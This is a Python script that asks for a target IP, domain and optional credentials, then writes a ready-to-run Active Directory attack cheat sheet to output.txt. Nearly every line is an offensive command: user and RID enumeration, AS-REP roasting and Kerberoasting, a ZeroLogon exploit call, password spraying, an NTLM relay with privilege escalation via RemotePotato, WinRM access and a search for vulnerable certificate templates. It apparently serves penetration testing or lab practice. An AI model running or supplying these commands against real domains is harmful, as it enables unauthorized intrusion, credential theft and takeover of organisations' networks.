#!/bin/python3
import sys

def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password):
    # ANSI escape codes for red color and reset
    RED = '\033[31m'
    RESET = '\033[0m'

    ascii_art = RED + r"""
           (  )   /\   _                 (
            \ |  (  \ ( \.(               )            _____
          \  \ \  `  `   ) \             (  ___                 (  )   /\   _
       (_`    \+   . x   ( .\            \/   \          )      \ |  (  \ ( \.(               )            _____
      - .-               \+  ;          (     )        (  (     \  \ \  `  `   ) \             (  ___
           WELCOME TO      )  )        _)   ) _         )  )      (_`    \+   . x   ( .\            \/   \
         THE AD SYNTAX   (__/          \____/          (_(_()   - .-               \+  ;          (     )
               FILLER,    /             /               /                        )  )        _)   ) _
           SAVING YOU    (             (               /    made with love by bandors (__/          \____/
              TIME SINCE  2024

    """ + RESET
    # Open the output.txt file in write mode
    with open('output.txt', 'w') as f:
        f.write(ascii_art + '\n')



        #Zone Transfer
        f.write("# Zone transfer (Unlikely with AD)\n")
        f.write(f"dig axfr {domain} @{target_ip}\n")
        f.write("\n")

        # RID brute force commands
        f.write("# Guest RID brute\n")
        f.write(f"netexec smb {domain} -u anonymous -p '' --rid-brute 10000\n")
        f.write(f"lookupsid.py {domain}/anonymous@{target_ip}\n")
        f.write("\n")

        # Authenticated RID brute
        if user and password:
            f.write("# Authenticated RID brute\n")
            f.write(f"netexec smb {domain} -u {user} -p '{password}' --rid-brute 10000\n")
            f.write(f"lookupsid.py {domain}/{user}:'{password}'@{target_ip}\n")
            f.write("\n")

        #Kerbrute user enumeration command
        f.write("# Kerbrute user enumeration\n")
        f.write(f"kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {target_ip}\n")
        f.write("\n")

        #RPC Enumeration commands
        f.write("# RPC Enumeration\n")
        if user:
            f.write(f"rpcclient -U \"{user}\" -N {target_ip}\n")
            f.write("cat dirty.txt | cut -b 7-999 | rev | cut -b 14-99 | rev > users.txt\n\n")
        else:
            f.write(f"rpcclient -U \"\" -N {target_ip}\n")
            f.write("cat dirty.txt | cut -b 7-999 | rev | cut -b 14-99 | rev > users.txt\n\n")
        f.write("\n")

        #AS-Rep Roasting command
        f.write("# AS Rep Roasting\n")
        f.write(f"for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip {target_ip} {domain}/${{user}} | grep -v Impacket; done\n")
        f.write("\n")

        #Kerberoasting commands
        f.write("#Kerberoasting\n")
        f.write("#Kerberoasting as a guest\n")
        f.write(f"faketime -f +7h GetUserSPNs.py -target-domain {domain} -usersfile users.txt -dc-ip {hostname}.{domain} {domain}/guest -no-pass\n")

        if user and password:
            f.write("#Authenticated Kerberoasting\n")
            f.write(f"GetUserSPNs.py -request -dc-ip {target_ip} {domain}/{user} -save -outputfile GetUserSPNs.out\n")
        f.write("#Kerberoasting off of a user who was AS-REP roastable, but not crackable!\n")
        f.write(f"GetUserSPNs.py -no-preauth '{user if user else 'guest'}' -usersfile 'users.txt' -dc-host '{hostname}.{domain}' '{domain}'/\n")
        f.write("\n")

        #LDAP enumeration commands
        f.write("# LDAP Enumeration\n")
        f.write(f"Run without any pipes first to see if any data shows up.\n")
        f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"dc={domain.split('.')[0]},dc={domain.split('.')[1]}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n")
        f.write(f"kerbrute userenum --dc {hostname}.{domain} -d {domain} users.txt\n")
        f.write("\n")

        #ZeroLogon check command
        f.write("# ZeroLogon Check\n")
        f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n")
        f.write("\n")

        #Bloodhound Python command
        f.write("# Bloodhound Python ingestor\n")
        if user and password:
            f.write(f"faketime -f +7h bloodhound-ce-python -c ALL -u '{user}' -p '{password}' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
        else:
            f.write(f"faketime -f +7h bloodhound-ce-python -c ALL -u 'guest' -p '' -d {domain} -dc {hostname}.{domain} -ns {target_ip}\n")
        f.write("\n")

        #Powerview.py enumeration commands (only if creds are provided)
        if user and password:
            f.write("# Powerview.py enumeration\n")
            f.write(f"faketime -f +7h getTGT.py {domain}/{user}:'{password}'\n")
            f.write(f"export KRB5CCNAME=./{user}.ccache\n")
            f.write(f"faketime -f +7h powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n")
            f.write("\n")

            # Password Policy Enumeration
            f.write("## Password Policy Enumeration\n")
            if user and password:
                f.write(f"netexec smb {target_ip} -u '{user}' -p '{password}' --pass-pol\n")
                f.write(f"crackmapexec smb {target_ip} -u '{user}' -p '{password}' --pass-pol\n")
            else:
                f.write(f"# Requires credentials for password policy enumeration\n")
            f.write("\n")
        
        #Password spraying
        f.write("# Password Spray\n")
        if user and password:
            f.write(f"netexec smb {target_ip} -u users.txt -p '{password}' --continue-on-success\n")
        else:
            f.write(f"netexec smb {target_ip} -u users.txt -p passwords.txt --continue-on-success\n")
            f.write(f"netexec smb {target_ip} -u users.txt -p users.txt --continue-on-success\n")
        f.write("\n")

        #RemotePotato check commands
        f.write("# RemotePotato Check\n")
        f.write(f"sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{target_ip}:9999\n")
        f.write(f"sudo ntlmrelayx.py -t ldap://{target_ip} --no-wcf-server --escalate-user normal_user\n")
        f.write(f".\\RemotePotato0.exe -m 2 -r {local_ip} -x {local_ip} -p 9999 -s 1\n")
        f.write("\n")

        #SMB Enumeration commands
        if user and password:
            f.write("# SMB Enumeration with credentials\n")
            f.write(f"smbmap -u '{user}' -p '{password}' -H {target_ip}\n")
            f.write(f"sudo smbclient //{target_ip}/example -U '{user}'%'{password}'\n")
        else:
            f.write("# SMB Enumeration\n")
            f.write(f"sudo smbclient -N -L //{target_ip}\n")
            f.write(f"smbmap -u '' -p '' -H {target_ip}\n")
            # Added example share connection command for no credentials
            f.write("# Example Share Connection (without credentials)\n")
            f.write(f"sudo smbclient //{target_ip}/example -N\n")
        f.write("\n")

        # Include WinRM Access command when creds are provided
        if user and password:
            f.write("# WinRM Access\n")
            f.write(f"sudo evil-winrm -i {target_ip} -u {user} -p '{password}'\n")
            f.write("\n")
        # ADCS checking
        if user and password:
            f.write("# Check for ADCS\n")
            f.write(f"netexec ldap {target_ip} -u {user} -p '{password}' -M adcs\n\n")

            f.write("# Check for bad templates\n")
            f.write(f"certipy find -scheme ldap -u {user}@{domain} -p '{password}' -target {hostname}.{domain} -dc-ip {target_ip} -vulnerable -stdout\n\n")

        f.write("# Try to connect to MSSQL\n")
        f.write("# (Try with/without -windows-auth)\n")
        f.write(f"mssqlclient.py {domain}/sql_svc@{target_ip} -windows-auth\n\n")

    print("output.txt file generated successfully.")

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ")
    hostname = input("Enter Hostname: ")
    domain = input("Enter Domain: ")
    local_ip = input("Enter Local IP: ")
    user = input("Enter User (can be blank): ")
    password = input("Enter Password (can be blank): ")

    create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, password)
